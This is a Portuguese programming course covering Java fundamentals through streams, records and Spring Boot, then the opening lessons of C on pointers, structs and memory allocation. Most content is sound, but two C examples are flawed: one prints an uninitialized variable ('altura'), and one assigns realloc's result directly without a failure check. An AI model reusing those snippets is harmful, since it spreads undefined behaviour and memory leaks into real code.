Esta é a segunda linguagem de chaves e ponto e vírgula que você vê: JavaScript foi a primeira, e o `for`, o `if` e o `while` do Java são quase iguais aos de lá. C e C++, nos próximos módulos, seguem a mesma família. A novidade aqui não é a sintaxe, é a **disciplina**: tudo tem tipo declarado, tudo vive dentro de uma classe, e o compilador não deixa passar.

**Sobre Java vir depois do Python e antes do C:** Java é o degrau intermediário perfeito. Ele te obriga a declarar tipo (como C vai obrigar) mas continua limpando a memória por você (como Python faz). Quando você chegar no C, metade do choque já terá passado.

**Ferramentas:** instale o [JDK 21](https://adoptium.net/) (versão LTS, gratuita) e o [IntelliJ IDEA Community](https://www.jetbrains.com/idea/download/). O IntelliJ é gratuito na versão Community e é o melhor ambiente de Java que existe — não tente aprender Java no bloco de notas.

---

## Nível Básico

### Aula 5.1 — Como um programa Java é montado

```java
public class OlaMundo {
    public static void main(String[] args) {
        System.out.println("Olá, mundo");
    }
}
```

Cinco linhas e sete palavras reservadas para imprimir um texto. Em Python seria uma linha. Vamos por partes, porque cada peça tem motivo:

- `public class OlaMundo` — **tudo em Java vive dentro de uma classe.** Não existe código solto como em Python. O arquivo tem que se chamar `OlaMundo.java`, com o mesmo nome da classe pública. Essa regra é do compilador, não é estilo.
- `public static void main(String[] args)` — o ponto de entrada. A JVM procura exatamente essa assinatura para saber por onde começar. `static` significa que roda sem precisar criar um objeto; `String[] args` recebe o que você digitou na linha de comando.
- `System.out.println(...)` — `System` é uma classe, `out` é a saída padrão, `println` imprime com quebra de linha.

**Como rodar:**

```bash
javac OlaMundo.java     # compila → gera OlaMundo.class (bytecode)
java OlaMundo           # executa o bytecode na JVM
```

Repare que são **duas etapas** — diferente de Python e JavaScript, onde você manda rodar o arquivo e pronto. Mas o `javac` não gera código de máquina: gera *bytecode*, uma linguagem intermediária que a **JVM** (Java Virtual Machine) executa. É daí que vem o slogan antigo *"escreva uma vez, rode em qualquer lugar"* — o mesmo `.class` roda no Windows, no Linux e no Mac sem recompilar, porque cada sistema tem sua própria JVM.

*(Android é a exceção que confunde todo mundo: apesar de você escrever Java, o `.class` não roda lá. Ele passa por uma conversão a mais, para um formato chamado DEX, executado pelo ART — o runtime do Android, que não é uma JVM.)*

| Sigla | O que é |
|-------|---------|
| **JDK** | O kit do desenvolvedor: compilador + ferramentas + tudo que executa. É o que você instala |
| **JRE** | Só o necessário para *executar* Java, sem compilador |
| **JVM** | A máquina virtual que roda o bytecode |

Você instala o JDK e tem os três. O JRE separado existia até o Java 8 — hoje ninguém baixa mais isso, mas o nome ainda aparece em documentação antiga e em pergunta de prova.

### Aula 5.2 — Tipos: primitivo contra objeto

Java tem **dois mundos de tipos**, e confundir os dois é a origem de uma classe inteira de bugs.

**Primitivos** — guardam o valor direto, começam com letra minúscula, nunca são nulos:

| Tipo | Guarda | Tamanho | Exemplo |
|------|--------|---------|---------|
| `int` | Inteiro | 32 bits | `42` |
| `long` | Inteiro grande | 64 bits | `42L` |
| `double` | Decimal | 64 bits | `3.14` |
| `float` | Decimal menor | 32 bits | `3.14f` |
| `boolean` | Verdadeiro/falso | — | `true` |
| `char` | Um caractere | 16 bits | `'a'` |
| `byte` | Inteiro minúsculo | 8 bits | `127` |
| `short` | Inteiro pequeno | 16 bits | `32000` |

**Objetos** — guardam uma referência, começam com maiúscula, podem ser `null`:

```java
int idade = 25;              // primitivo
Integer idadeObj = 25;       // objeto (autoboxing converte sozinho)
String nome = "Maria";       // objeto
```

```java
int a = 10;
double b = a;          // OK — cabe, converte sozinho (widening)
int c = (int) 3.99;    // 3 — precisa de cast, e TRUNCA, não arredonda
```

**Atenção nessa pegadinha:** divisão entre inteiros descarta a parte decimal.

```java
int resultado = 7 / 2;          // 3, não 3.5
double certo = 7 / 2;           // 3.0 — ainda errado! a conta rodou como int
double melhor = 7 / 2.0;        // 3.5 — agora sim
```

A regra: se os dois lados são `int`, a conta é de `int`. Converter depois não recupera o que já se perdeu.

**A armadilha do overflow:** `int` vai até 2.147.483.647. Passar disso não dá erro — ele dá a volta e vira negativo.

```java
int max = Integer.MAX_VALUE;
System.out.println(max + 1);    // -2147483648
```

Para dinheiro, nunca use `double` (ele erra centavos por ser binário). Use `BigDecimal`.

### Aula 5.3 — String, e o erro mais famoso do Java

```java
String nome = "Maria";
nome.length();              // 5
nome.toUpperCase();         // "MARIA"
nome.charAt(0);             // 'M'
nome.substring(0, 3);       // "Mar"
nome.contains("ari");       // true
nome.replace("a", "@");     // "M@ri@"
nome.trim();                // remove espaços das pontas
nome.split(",");            // devolve String[]
String.join("-", "a", "b"); // "a-b"
```

**String em Java é imutável.** Nenhum método acima muda `nome` — todos devolvem uma String nova. Isso pega muita gente:

```java
String s = "abc";
s.toUpperCase();
System.out.println(s);       // "abc" — você jogou o resultado fora
s = s.toUpperCase();         // agora sim
```

**O erro mais comum de todo iniciante em Java:** comparar String com `==`.

```java
String a = new String("oi");
String b = new String("oi");

a == b          // false — são dois objetos diferentes na memória
a.equals(b)     // true  — mesmo conteúdo
```

`==` em objetos pergunta *"são o mesmo objeto?"*. `.equals()` pergunta *"têm o mesmo conteúdo?"*. Para texto você quase sempre quer o segundo.

O que confunde é que às vezes `==` parece funcionar:

```java
String x = "oi";
String y = "oi";
x == y          // true — as duas apontam para a MESMA String do pool
```

Java guarda literais num *pool* e reaproveita. Então `==` funciona por acidente com literais e quebra com `new` ou com texto vindo de entrada do usuário. **Use `.equals()` sempre**, e você nunca precisa pensar nisso.

Para montar texto em laço, `+` é lento (cria uma String nova a cada volta). Use `StringBuilder`:

```java
StringBuilder sb = new StringBuilder();
for (int i = 0; i < 1000; i++) {
    sb.append(i).append(", ");
}
String resultado = sb.toString();
```

### Aula 5.4 — Controle de fluxo

Igual ao que você já viu em JavaScript, com duas adições modernas:

```java
if (idade >= 18) { } else if (idade >= 16) { } else { }

String status = idade >= 18 ? "adulto" : "menor";       // ternário

for (int i = 0; i < 5; i++) { }

int[] numeros = {1, 2, 3};
for (int n : numeros) { }          // for-each: percorre sem índice

while (condicao) { }
do { } while (condicao);
```

**Switch.** A forma antiga, que você ainda vai encontrar em código existente:

```java
String tipo;
switch (dia) {
    case "sábado":
    case "domingo":
        tipo = "Fim de semana";
        break;              // sem este break, a execução escorre para o próximo caso
    case "sexta":
        tipo = "Quase lá";
        break;
    default:
        tipo = "Dia útil";
}
```

A forma moderna (Java 14+) faz o mesmo em menos linhas:

```java
String tipo = switch (dia) {
    case "sábado", "domingo" -> "Fim de semana";
    case "sexta" -> "Quase lá";
    default -> "Dia útil";
};
```

Ponha as duas lado a lado e veja o que sumiu: **os `break`**. Na forma antiga, esquecer um faz a execução continuar no caso seguinte e atribuir o valor errado — bug clássico, que ninguém percebe porque o código compila normalmente. A seta `->` não escorre, então o erro deixou de existir. De quebra, o switch moderno **devolve um valor**, o que permite atribuí-lo direto a uma variável em vez de declarar antes e preencher dentro.

### Aula 5.5 — Arrays e a classe Arrays

```java
int[] numeros = new int[5];              // 5 posições, tudo zero
int[] notas = {7, 8, 9, 10};             // criado já com valores

notas[0];              // 7
notas.length;          // 4  — atributo, não método! (String usa length())
```

Array em Java tem **tamanho fixo**, decidido na criação. Precisa crescer? Use `ArrayList`, na Aula 5.8.

```java
import java.util.Arrays;

Arrays.sort(notas);                      // ordena no lugar
Arrays.toString(notas);                  // "[7, 8, 9, 10]" — para imprimir
Arrays.fill(numeros, 1);                 // preenche tudo com 1
Arrays.copyOf(notas, 6);                 // copia com tamanho novo
```

**Atenção nessa pegadinha:** imprimir array direto não mostra o conteúdo.

```java
System.out.println(notas);               // [I@1b6d3586  — o endereço
System.out.println(Arrays.toString(notas)); // [7, 8, 9, 10]
```

---

## Nível Intermediário

### Aula 5.6 — Classes e os quatro pilares

```java
public class ContaBancaria {

    private String titular;        // encapsulamento: ninguém mexe direto
    private double saldo;

    public ContaBancaria(String titular, double saldoInicial) {   // construtor
        this.titular = titular;
        this.saldo = saldoInicial;
    }

    public void depositar(double valor) {
        if (valor <= 0) {
            throw new IllegalArgumentException("Valor deve ser positivo");
        }
        this.saldo += valor;
    }

    public boolean sacar(double valor) {
        if (valor > saldo) return false;
        saldo -= valor;
        return true;
    }

    public double getSaldo() {     // getter
        return saldo;
    }
}
```

Usando:

```java
ContaBancaria conta = new ContaBancaria("Ana", 100.0);
conta.depositar(50);
conta.getSaldo();        // 150.0
conta.saldo;             // ERRO de compilação — é private
```

**Os quatro pilares**, que caem em toda entrevista:

| Pilar | O que é | No exemplo acima |
|-------|---------|------------------|
| **Encapsulamento** | Esconder o estado interno atrás de métodos | `saldo` é `private`, só muda por `depositar`/`sacar` |
| **Herança** | Uma classe aproveitar outra | `ContaPoupanca extends ContaBancaria` |
| **Polimorfismo** | O mesmo método se comportar diferente | `sacar` exigindo saldo mínimo na poupança (Aula 5.7) |
| **Abstração** | Expor o que faz, esconder como faz | Quem usa não sabe se o saldo é `double` ou `BigDecimal` |

**Regra do encapsulamento:** atributo é `private` por padrão. Só abra o que precisa, e abra por método — assim você pode validar, como o `depositar` faz ao recusar valor negativo.

**Cuidado ao copiar este exemplo:** o `saldo` aqui é `double` para o código caber na tela, mas na Aula 5.2 eu disse para nunca usar `double` com dinheiro — e continua valendo. Conta de verdade usa `BigDecimal`, que é mais verboso (`saldo.add(valor)` em vez de `saldo += valor`) e por isso atrapalharia a explicação de encapsulamento. Guarde a diferença: aqui o assunto é orientação a objetos, não precisão decimal.

### Aula 5.7 — Herança, interfaces e polimorfismo

```java
public class ContaPoupanca extends ContaBancaria {

    private double taxaJuros;

    public ContaPoupanca(String titular, double saldo, double taxa) {
        super(titular, saldo);          // chama o construtor do pai
        this.taxaJuros = taxa;
    }

    @Override
    public boolean sacar(double valor) {     // sobrescreve o do pai
        if (valor > getSaldo() - 10) return false;   // guarda saldo mínimo
        return super.sacar(valor);
    }
}
```

A anotação `@Override` não é obrigatória, mas **use sempre**: ela faz o compilador conferir que você realmente está sobrescrevendo algo. Sem ela, um erro de digitação no nome do método cria um método novo silenciosamente, e você passa a tarde procurando por que o comportamento não mudou.

**Interface** — um contrato, sem implementação:

```java
public interface Tributavel {
    double calcularImposto();          // só a assinatura
}

public class ContaPoupanca extends ContaBancaria implements Tributavel {
    @Override
    public double calcularImposto() {
        return getSaldo() * 0.005;
    }
}
```

**Herança contra interface — quando usar cada uma:**

- Herança responde *"é um tipo de"*. Poupança **é uma** conta.
- Interface responde *"consegue fazer"*. Poupança **consegue** ser tributada.

Java só permite **herdar de uma classe**, mas **implementar quantas interfaces quiser**. Na dúvida, prefira interface — herança amarra sua classe a uma hierarquia que é difícil de desfazer depois.

**Polimorfismo na prática** — o poder de verdade disso:

```java
List<ContaBancaria> contas = List.of(
    new ContaBancaria("Ana", 100),
    new ContaPoupanca("João", 200, 0.01)
);

for (ContaBancaria c : contas) {
    c.sacar(50);        // cada uma usa a SUA versão de sacar
}
```

O laço não sabe nem se importa com qual tipo concreto está tratando. Adicionar `ContaSalario` amanhã não muda uma linha aqui.

**Classe abstrata** fica no meio do caminho: tem código pronto *e* buracos a preencher.

```java
public abstract class Funcionario {

    private final String matricula;

    protected Funcionario(String matricula) {
        this.matricula = matricula;
    }

    public abstract double calcularSalario();   // filho é obrigado a escrever

    public String cracha() {                    // já vem pronto
        return "FUNC-" + matricula;
    }
}
```

Não dá para fazer `new Funcionario()` — ela existe só para ser herdada.

### Aula 5.8 — Collections: List, Set e Map

É aqui que Java fica produtivo. Esqueça arrays de tamanho fixo.

```java
import java.util.*;

// LIST — ordenada, aceita repetidos, cresce sozinha
List<String> nomes = new ArrayList<>();
nomes.add("Ana");
nomes.add("João");
nomes.get(0);              // "Ana"
nomes.size();              // 2  (array usa .length, lista usa .size())
nomes.remove("Ana");
nomes.contains("João");    // true

// SET — sem repetidos, sem ordem garantida
Set<String> unicos = new HashSet<>();
unicos.add("Ana");
unicos.add("Ana");         // ignorado
unicos.size();             // 1

// MAP — pares chave:valor
Map<String, Integer> idades = new HashMap<>();
idades.put("Ana", 30);
idades.get("Ana");                    // 30
idades.get("Zé");                     // null
idades.getOrDefault("Zé", 0);         // 0 — mais seguro
idades.containsKey("Ana");            // true

for (Map.Entry<String, Integer> e : idades.entrySet()) {
    System.out.println(e.getKey() + ": " + e.getValue());
}
```

**Qual escolher:**

| Preciso de | Use |
|------------|-----|
| Lista ordenada, com repetidos | `ArrayList` |
| Muita inserção/remoção no meio | `LinkedList` |
| Garantir que não há repetidos | `HashSet` |
| Sem repetidos, mantendo ordem de inserção | `LinkedHashSet` |
| Busca por chave | `HashMap` |
| Busca por chave, ordenado por chave | `TreeMap` |

**A pegadinha que derruba gente experiente:** se você usa seus próprios objetos como chave de `HashMap` ou dentro de `HashSet`, precisa sobrescrever `equals()` **e** `hashCode()` — os dois, sempre juntos.

```java
Set<Pessoa> pessoas = new HashSet<>();
pessoas.add(new Pessoa("Ana"));
pessoas.add(new Pessoa("Ana"));
pessoas.size();      // 2! sem equals/hashCode, são objetos diferentes
```

Sem isso, o `HashSet` usa a identidade do objeto e sua deduplicação simplesmente não acontece. O IntelliJ gera os dois métodos com `Alt+Insert` — mas entenda o porquê antes de gerar.

### Aula 5.9 — Exceções

```java
int divisor = 0;

try {
    int resultado = 10 / divisor;       // lança ArithmeticException
    System.out.println(resultado);      // nunca chega aqui

} catch (ArithmeticException e) {
    System.out.println("Divisão por zero");

} catch (NullPointerException e) {      // outro tipo, outro tratamento
    System.out.println("Objeto nulo: " + e.getMessage());

} finally {
    System.out.println("Sempre executa");
}
```

Você pode empilhar quantos `catch` quiser — o primeiro cujo tipo bater é o que roda, e os outros são ignorados. Como aqui a divisão estoura logo na primeira linha, o resto do `try` nem é executado: exceção interrompe o bloco na hora.

Java divide exceções em duas famílias, e essa divisão não existe em Python nem em JavaScript:

| Família | Quem é | O compilador obriga a tratar? |
|---------|--------|-------------------------------|
| **Checked** | `IOException`, `SQLException` | **Sim** — ou trata, ou declara `throws` |
| **Unchecked** | `NullPointerException`, `IllegalArgumentException` | Não |

```java
// Checked: o compilador NÃO deixa compilar sem tratar
public void lerArquivo() throws IOException {
    Files.readString(Path.of("dados.txt"));
}
```

**Regra:** capture exceções específicas, nunca `catch (Exception e)` genérico. O genérico engole a informação que resolveria seu problema em cinco segundos.

**`try-with-resources`** fecha o que precisa ser fechado, mesmo se der erro — é o `with` do Python:

```java
try (BufferedReader br = Files.newBufferedReader(Path.of("dados.txt"))) {
    System.out.println(br.readLine());
}   // fecha sozinho, aconteça o que acontecer
```

**Sobre o NullPointerException:** é o erro mais comum do Java, e a causa é sempre a mesma — você chamou um método em algo que era `null`. A Aula 5.12 mostra o `Optional`, que é a resposta moderna para isso.

### Aula 5.10 — Generics

O `<String>` que você viu em `List<String>` é um **generic**: ele diz ao compilador que tipo vive dentro daquela coleção.

```java
List<String> nomes = new ArrayList<>();
nomes.add("Ana");
nomes.add(42);            // ERRO de compilação — e ainda bem

String primeiro = nomes.get(0);      // sem cast, o compilador já sabe
```

Generics chegaram no **Java 5**. Antes deles tudo era `Object` e você fazia cast na mão — e descobria o erro só ao rodar. O generic move esse erro para a compilação, que é onde erro é barato.

Escrevendo o seu:

```java
public class Caixa<T> {
    private T conteudo;

    public void guardar(T item) { this.conteudo = item; }
    public T pegar() { return conteudo; }
}

Caixa<String> caixaTexto = new Caixa<>();
caixaTexto.guardar("oi");
String s = caixaTexto.pegar();     // sem cast
```

`T` é só um nome convencional para "algum tipo". Você vai ver `E` (element), `K` (key) e `V` (value) pelas mesmas razões.

---

## Nível Avançado

### Aula 5.11 — Lambdas e Streams

Este é o Java moderno, e é o que separa código de 2010 de código de hoje.

**Lambda** é uma função anônima curta — o mesmo conceito da arrow function do JavaScript:

```java
// Antes
Collections.sort(nomes, new Comparator<String>() {
    public int compare(String a, String b) { return a.compareTo(b); }
});

// Com lambda
nomes.sort((a, b) -> a.compareTo(b));

// Melhor ainda
nomes.sort(Comparator.naturalOrder());
```

**Stream** é um encadeamento de operações sobre uma coleção — o `map`/`filter`/`reduce` que você já usou em JavaScript:

```java
List<Produto> produtos = List.of(
    new Produto("Camisa", "Roupa", 50, 3),
    new Produto("Calça", "Roupa", 120, 0),
    new Produto("Boné", "Acessório", 30, 7)
);

double total = produtos.stream()
    .filter(p -> p.estoque() > 0)
    .mapToDouble(p -> p.preco() * p.estoque())
    .sum();
```

*(`Produto` aqui é um **record**, e por isso os acessos são `p.preco()` e não `p.getPreco()`. A Aula 5.12 mostra o que é — por ora, leia como uma classe de dados.)*

Lê-se de cima para baixo, exatamente como o encadeamento que você escreveu em JavaScript no Módulo 3. As linguagens conversam mais do que parece.

Operações que você vai usar toda semana:

```java
lista.stream()
    .filter(x -> x > 10)           // mantém quem passa
    .map(x -> x * 2)               // transforma cada item
    .sorted()                      // ordena
    .distinct()                    // remove repetidos
    .limit(5)                      // pega os 5 primeiros
    .toList();                     // devolve List

produtos.stream().anyMatch(p -> p.preco() > 100);    // algum?
produtos.stream().allMatch(p -> p.preco() > 10);     // todos?
produtos.stream().findFirst();                        // o primeiro (Optional)

Map<String, List<Produto>> porCategoria = produtos.stream()
    .collect(Collectors.groupingBy(Produto::categoria));
```

O `Produto::categoria` é **method reference** — açúcar para `p -> p.categoria()`.

**A pegadinha do stream:** ele é *preguiçoso* e de *uso único*.

```java
Stream<String> s = nomes.stream();
s.filter(n -> n.length() > 3);       // não roda nada! falta operação final
s.toList();                          // IllegalStateException — já foi consumido
```

Nada acontece até chegar uma operação terminal (`toList`, `sum`, `forEach`, `collect`). E depois que ela roda, aquele stream morreu — crie outro a partir da coleção.

*(O `.toList()` direto no stream existe a partir do Java 16. Em código mais antigo você vai ver `.collect(Collectors.toList())`, que faz o mesmo.)*

### Aula 5.12 — Records e Optional

**Record** (Java 16+) — uma classe que só carrega dados, em uma linha:

```java
public record Produto(String nome, String categoria, double preco, int estoque) { }
```

Isso já te dá construtor, acessos (`p.nome()`), `equals()`, `hashCode()` e `toString()` prontos e corretos. As trinta linhas de cerimônia que davam fama ruim ao Java sumiram.

```java
Produto p = new Produto("Camisa", "Roupa", 50, 3);
p.nome();                 // "Camisa"
p.equals(outro);          // compara por conteúdo, de graça
```

Repare que o acesso é `p.nome()`, sem o `get` na frente — record não segue a convenção de *getter* das classes comuns.

Use record para tudo que for dado imutável — resposta de API, linha de banco, valor de configuração.

**Optional** — a resposta ao NullPointerException:

```java
Optional<Usuario> achado = repositorio.buscarPorEmail("a@b.com");

achado.isPresent();                          // tem alguém?
achado.orElse(new Usuario("visitante"));     // valor padrão
achado.orElseThrow();                        // ou explode com mensagem clara
achado.map(Usuario::nome).orElse("anônimo"); // encadeia com segurança
```

`Optional` obriga quem chama a **encarar a possibilidade da ausência**, em vez de descobrir na marra com um NPE.

**Regra:** use `Optional` como **retorno** de método. Não use como atributo de classe nem como parâmetro — nesses lugares ele só adiciona ruído.

### Aula 5.13 — Maven, testes e o ecossistema

Nenhum projeto Java real é compilado na mão. **Maven** cuida das dependências e do build:

```xml
<dependency>
    <groupId>org.junit.jupiter</groupId>
    <artifactId>junit-jupiter</artifactId>
    <version>5.10.0</version>
    <scope>test</scope>
</dependency>
```

```bash
mvn clean install     # baixa dependências, compila, roda testes, empacota
mvn test              # só os testes
```

**Teste com JUnit** — e aqui o Java é referência, o ferramental é dos melhores que existem:

```java
import org.junit.jupiter.api.Test;
import static org.junit.jupiter.api.Assertions.*;

class ContaBancariaTest {

    @Test
    void deveDepositarValorPositivo() {
        ContaBancaria conta = new ContaBancaria("Ana", 100);
        conta.depositar(50);
        assertEquals(150.0, conta.getSaldo(), 0.001);   // o 3º argumento é a tolerância
    }

    @Test
    void deveRecusarDepositoNegativo() {
        ContaBancaria conta = new ContaBancaria("Ana", 100);
        assertThrows(IllegalArgumentException.class, () -> conta.depositar(-10));
    }
}
```

**Para onde Java leva** — depois da base, escolha **uma** trilha:

| Trilha | Ferramentas | Para quem quer |
|--------|-------------|----------------|
| Back-end corporativo | **Spring Boot**, JPA/Hibernate, PostgreSQL | A maior fatia de vagas do Brasil |
| Android | Kotlin, Jetpack Compose | Aplicativo de celular |
| Big Data | Spark, Kafka | Dados em escala |

Se o objetivo é emprego, **Spring Boot** é a resposta. É o framework dominante no mercado corporativo brasileiro — abra qualquer site de vagas, filtre por Java e conte quantos anúncios não pedem Spring; vão sobrar poucos. Mas não pule para o Spring sem os projetos abaixo — framework em cima de base fraca produz gente que sabe anotar `@Service` e não sabe explicar o que acontece por baixo.

---

## Projetos do Módulo 5

**Projeto 1 — Sistema de biblioteca (orientação a objetos)**
Classes `Livro`, `Usuario` e `Emprestimo`. Cadastrar, emprestar, devolver, listar atrasados. Use herança para tipos de usuário com prazos diferentes, e interface para o que é multável. Sem banco de dados ainda — guarde em `List` na memória.

**Projeto 2 — Processador de arquivos (collections e streams)**
Leia um CSV de vendas com algumas centenas de linhas e produza um relatório: total por vendedor, produto mais vendido, média por mês. Faça tudo com Streams, sem um único `for`. É o exercício que fixa a Aula 5.11.

**Projeto 3 — API REST com Spring Boot (integração)**
CRUD completo, banco H2 ou PostgreSQL, validação de entrada, tratamento de erro devolvendo status HTTP correto e testes com JUnit. Depois **conecte o front-end do Módulo 3 nessa API** — a mesma que você fez em Python no Módulo 4, agora em Java, e você entende de verdade o que muda entre as duas.

---

## Checklist de saída do Módulo 5

- [ ] Explico por que `==` não serve para comparar String
- [ ] Sei a diferença entre primitivo e objeto, e o que é autoboxing
- [ ] Escolho entre `List`, `Set` e `Map` sem consultar
- [ ] Sei por que `equals` e `hashCode` andam sempre juntos
- [ ] Explico herança contra interface com um exemplo meu
- [ ] Escrevo um pipeline de Stream com `filter`, `map` e `collect`
- [ ] Sei a diferença entre exceção checked e unchecked
- [ ] Tenho uma API em Spring Boot que meu front-end consome

---

# MÓDULO 6 — C

> **Dificuldade:** ●●●●○ · **Tempo:** 10 a 12 semanas · **Pré-requisito:** Módulos 0, 3 e 4

**Objetivo:** entender como o computador realmente funciona. Memória, ponteiros, tipos, compilação.

Aqui as rodinhas saem. Python e JavaScript escondiam de você a memória, os tipos e o gerenciamento de recursos. C não esconde nada — e é exatamente por isso que ele vale a pena.

**Você não vai usar C no trabalho** (provavelmente). Você vai usar o **entendimento** que C te dá em todas as outras linguagens. Depois de C, você entende por que uma lista em Python é lenta, por que passar objeto para função em JS modifica o original, o que é vazamento de memória.

**Ferramentas:** compilador GCC. No Windows, instale via MSYS2 ou use WSL. Compile com avisos ligados sempre:

```bash
gcc -Wall -Wextra -g programa.c -o programa
./programa
```

---

## Nível Básico

### Aula 6.1 — Estrutura e compilação

```c
#include <stdio.h>      // inclui a biblioteca de entrada/saída

int main() {
    printf("Olá, mundo!\n");
    return 0;           // 0 significa "terminou sem erro"
}
```

Diferença fundamental: JavaScript e Python são **interpretados** — outro programa lê e executa seu código na hora. C é **compilado** — um compilador traduz tudo para linguagem de máquina antes, gerando um executável.

Consequências:
- C é muito mais rápido
- Erros de sintaxe aparecem antes de rodar, não durante
- O executável só funciona no sistema para o qual foi compilado

### Aula 6.2 — Tipos e declaração obrigatória

Em C você **declara o tipo** de toda variável, e ele nunca muda.

```c
int idade = 25;
float altura = 1.75;
double preciso = 3.14159265358979;
char letra = 'A';           // aspas simples, um único caractere
_Bool ligado = 1;

// Modificadores mudam o tamanho e o alcance
unsigned int positivo = 300;    // só valores positivos, dobra o alcance
long int grande = 2147483648L;
```

| Tipo | Tamanho típico | Alcance |
|------|----------------|---------|
| `char` | 1 byte | -128 a 127 |
| `int` | 4 bytes | -2.147.483.648 a 2.147.483.647 |
| `float` | 4 bytes | ~7 dígitos de precisão |
| `double` | 8 bytes | ~15 dígitos |

Isso importa: se você somar 1 ao maior `int` possível, ele **vira negativo**. Chama-se *overflow* e já derrubou foguete.

### Aula 6.3 — Entrada e saída

```c
#include <stdio.h>

int main() {
    int idade;
    float altura;
    char nome[50];

    printf("Nome: ");
    scanf("%49s", nome);        // limite o tamanho — sem isso há falha de segurança

    printf("Idade: ");
    scanf("%d", &idade);        // o & é obrigatório: passa o ENDEREÇO da variável

    printf("%s tem %d anos e %.2f de altura\n", nome, idade, altura);
    return 0;
}
```

**Especificadores de formato** — decore:

| Código | Tipo |
|--------|------|
| `%d` | int |
| `%f` | float |
| `%.2f` | float com 2 casas |
| `%c` | char |
| `%s` | string |
| `%p` | ponteiro (endereço) |
| `%lu` | unsigned long |

O `&` no `scanf` é sua primeira aparição de ponteiros. Ele significa "o endereço de". O `scanf` precisa saber *onde* guardar, não *o que* está guardado.

### Aula 6.4 — Controle de fluxo

Praticamente igual ao JavaScript:

```c
if (idade >= 18) {
    printf("Maior\n");
} else if (idade >= 16) {
    printf("Pode votar\n");
} else {
    printf("Menor\n");
}

for (int i = 0; i < 10; i++) {
    printf("%d ", i);
}

while (condicao) { }
do { } while (condicao);

switch (opcao) {
    case 1: printf("Um"); break;
    default: printf("Inválido");
}
```

---

## Nível Intermediário

### Aula 6.5 — Vetores e strings

```c
int numeros[5] = {1, 2, 3, 4, 5};
int matriz[3][4];                    // 3 linhas, 4 colunas

for (int i = 0; i < 5; i++) {
    printf("%d ", numeros[i]);
}
```

**C não verifica limites.** Se você escrever `numeros[10]`, o programa não reclama — ele grava numa região de memória que não é sua. Pode não dar erro na hora e corromper outra variável. Este é o tipo de bug mais difícil que existe, e é por isso que linguagens modernas fazem essa checagem.

**String em C é um vetor de char terminado em `\0`:**

```c
char nome[] = "Ana";
// Na memória: ['A']['n']['a']['\0']  — 4 posições, não 3
```

O `\0` (caractere nulo) marca onde a string acaba. Sem ele, funções como `printf` continuam lendo memória alheia até encontrar um zero por acaso.

```c
#include <string.h>

strlen(nome);              // comprimento (não conta o \0)
strcpy(destino, origem);   // copia
strcat(destino, origem);   // concatena
strcmp(a, b);              // compara: 0 se iguais
```

### Aula 6.6 — Ponteiros

**O conceito central de C.** Leia esta seção três vezes.

Toda variável mora num endereço de memória. Um **ponteiro** é uma variável que guarda um endereço.

```c
int idade = 25;
int *ptr = &idade;      // ptr guarda o ENDEREÇO de idade

printf("%d\n", idade);   // 25       — o valor
printf("%p\n", &idade);  // 0x7ffd… — o endereço
printf("%p\n", ptr);     // 0x7ffd… — o mesmo endereço
printf("%d\n", *ptr);    // 25       — o valor NAQUELE endereço
```

Dois operadores, e eles são opostos:

- `&` = "o endereço de" (pega o endereço)
- `*` = "o valor no endereço" (segue o endereço) — chamado *desreferenciar*

Analogia: `idade` é uma casa. `&idade` é o endereço escrito no papel. `ptr` é o papel. `*ptr` é entrar na casa.

**Para que serve na prática:**

```c
// SEM ponteiro: a função recebe uma CÓPIA, não muda nada fora
void tentarDobrar(int n) {
    n = n * 2;
}

// COM ponteiro: a função recebe o endereço e muda o original
void dobrar(int *n) {
    *n = *n * 2;
}

int main() {
    int x = 5;
    tentarDobrar(x);
    printf("%d\n", x);    // 5  — não mudou

    dobrar(&x);
    printf("%d\n", x);    // 10 — mudou
    return 0;
}
```

Este é o conceito de **passagem por valor vs. passagem por referência**, e ele explica um comportamento do JavaScript que provavelmente já te confundiu:

```javascript
function mudarNumero(n) { n = 99; }
function mudarObjeto(o) { o.valor = 99; }

let numero = 1;
mudarNumero(numero);
console.log(numero);          // 1   — não mudou

let objeto = { valor: 1 };
mudarObjeto(objeto);
console.log(objeto.valor);    // 99  — mudou
```

JavaScript nunca te contou por quê. C conta: o número foi copiado para dentro da função, como em `tentarDobrar`; o objeto teve o **endereço** copiado, como em `dobrar`. Nos dois casos a função recebeu uma cópia — a diferença é o que estava sendo copiado. É a mesma mecânica de ponteiro, só que escondida.

**Ponteiros e vetores** são quase a mesma coisa em C:

```c
int v[5] = {10, 20, 30, 40, 50};
int *p = v;          // o nome do vetor JÁ É um ponteiro para o primeiro elemento

*p;        // 10  — igual a v[0]
*(p + 1);  // 20  — igual a v[1]
```

Agora você entende por que o índice começa em zero: `v[0]` significa "ande zero posições a partir do início".

### Aula 6.7 — Funções

```c
// Protótipo: avisa ao compilador que a função existe
int somar(int a, int b);

int main() {
    printf("%d\n", somar(3, 4));
    return 0;
}

// Definição
int somar(int a, int b) {
    return a + b;
}
```

O protótipo é necessário porque o compilador C lê o arquivo de cima para baixo, uma vez só. Se `main` chama `somar` antes de conhecê-la, dá erro.

### Aula 6.8 — Structs

Agrupam dados relacionados. É o ancestral direto dos objetos:

```c
struct Pessoa {
    char nome[50];
    int idade;
    float altura;
};

int main() {
    struct Pessoa p1;
    strcpy(p1.nome, "Ana");
    p1.idade = 30;

    struct Pessoa p2 = {"Carlos", 25, 1.80};

    struct Pessoa *ptr = &p1;
    printf("%s\n", ptr->nome);      // -> acessa campo através de ponteiro
    return 0;
}
```

O `->` é atalho para `(*ptr).nome`. Você vai ver muito.

---

## Nível Avançado

### Aula 6.9 — Memória dinâmica

Até agora todo vetor tinha tamanho fixo, decidido na hora de escrever o código. E se você só souber o tamanho durante a execução?

```c
#include <stdlib.h>

int main() {
    int n;
    printf("Quantos números? ");
    scanf("%d", &n);

    // Aloca espaço para n inteiros
    int *vetor = (int *) malloc(n * sizeof(int));

    if (vetor == NULL) {              // SEMPRE verifique
        printf("Memória insuficiente\n");
        return 1;
    }

    for (int i = 0; i < n; i++) {
        vetor[i] = i * 10;
    }

    // Redimensiona
    vetor = realloc(vetor, (n * 2) * sizeof(int));

    free(vetor);         // OBRIGATÓRIO: devolve a memória
    vetor = NULL;        // evita usar ponteiro solto por acidente

    return 0;
}
```

| Função | Faz |
|--------|-----|
| `malloc` | Aloca memória (com lixo dentro) |
| `calloc` | Aloca e zera |
| `realloc` | Redimensiona |
| `free` | Libera |

**Toda alocação precisa de um `free` correspondente.** Se você esquecer, o programa vai consumindo memória até o sistema travar — é o **vazamento de memória** (*memory leak*). Python e JavaScript fazem isso automaticamente com o *garbage collector*; em C, o responsável é você.

